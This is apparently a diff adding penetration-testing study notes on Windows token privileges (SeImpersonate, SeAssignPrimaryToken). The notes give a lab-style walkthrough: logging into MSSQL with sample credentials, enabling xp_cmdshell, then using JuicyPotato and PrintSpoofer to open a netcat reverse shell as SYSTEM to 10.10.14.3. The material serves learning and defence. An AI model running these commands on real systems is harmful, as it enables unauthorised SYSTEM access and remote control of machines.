@@ -680,3 +680,168 @@ Look for:
 
 ---
 
+# SeImpersonate & SeAssignPrimaryToken
+
+## **1. Overview**
+
+Windows processes run with **access tokens** that identify:
+
+* User account
+* Groups
+* Privileges
+
+These tokens are stored in memory and are **not secure objects** — they can be impersonated if a process has the right privileges.
+
+Two of the most important token-related privileges are:
+
+* **SeImpersonatePrivilege**
+* **SeAssignPrimaryTokenPrivilege**
+
+These often allow escalation from **service account → SYSTEM**.
+
+
+## **2. What SeImpersonatePrivilege Does**
+
+**SeImpersonatePrivilege** allows a process to **impersonate another user's token** after that user has authenticated to it.
+
+### ✔ Legitimate Use Example
+
+* Services impersonating client accounts to access resources
+* API: `CreateProcessWithTokenW`
+
+### ✔ Why It's Dangerous
+
+Attackers can:
+
+1. Trick a SYSTEM process to authenticate to attacker-controlled server.
+2. Capture SYSTEM token.
+3. Create a new SYSTEM process.
+
+This is the basis for most **Potato-style exploits**.
+
+
+## **3. What SeAssignPrimaryTokenPrivilege Does**
+
+Allows a process to **assign a primary token to a new process**.
+
+### Key points:
+
+* Paired with SeIncreaseQuotaPrivilege
+* Used with API: `CreateProcessAsUser`
+* Rarely granted except to service accounts
+* Also abusable for escalation if present
+
+## **4. Common Attack Scenario**
+
+You gain RCE through:
+
+* Web shell (ASP.NET)
+* Jenkins RCE
+* MSSQL xp_cmdshell
+* Misconfigured service
+
+Then check:
+
+```cmd
+whoami /priv
+```
+
+If you see:
+
+```
+SeImpersonatePrivilege   Enabled
+```
+
+→ You can almost always escalate to SYSTEM.
+
+## **5. Example Walkthrough: MSSQL Service Abuse**
+
+## **5.1 Connecting to SQL Server**
+
+```bash
+mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+```
+
+Credentials example:
+
+```
+sql_dev : Str0ng_P@ssw0rd!
+```
+
+## **5.2 Enabling xp_cmdshell**
+
+```sql
+SQL> enable_xp_cmdshell
+```
+
+---
+
+## **5.3 Confirm Account Context**
+
+```sql
+SQL> xp_cmdshell whoami
+```
+
+Output example:
+
+```
+nt service\mssql$sqlexpress01
+```
+
+## **5.4 Checking Privileges**
+
+```sql
+SQL> xp_cmdshell whoami /priv
+```
+
+Look for:
+
+```
+SeImpersonatePrivilege        Enabled
+SeAssignPrimaryTokenPrivilege Disabled/Enabled
+```
+
+If SeImpersonate is present → **JuicyPotato** or **PrintSpoofer** is possible.
+
+
+## **6. JuicyPotato (DCOM / NTLM Reflection Abuse)**
+
+## **6.1 Command Example**
+
+```sql
+xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+```
+
+Flags:
+
+* `-l` → listening COM port
+* `-p` → program to run
+* `-a` → arguments
+* `-t *` → try all token creation methods
+
+If successful:
+
+```
+NT AUTHORITY\SYSTEM
+```
+
+
+# **7. PrintSpoofer (Windows 10 / Server 2019+)**
+
+JuicyPotato does **not** work on newer Windows builds.
+
+PrintSpoofer abuses the **Print Spooler** to impersonate SYSTEM.
+
+## **7.1 Command Example**
+
+```sql
+xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
+
+If successful:
+
+```
+nt authority\system
+```
+
+---
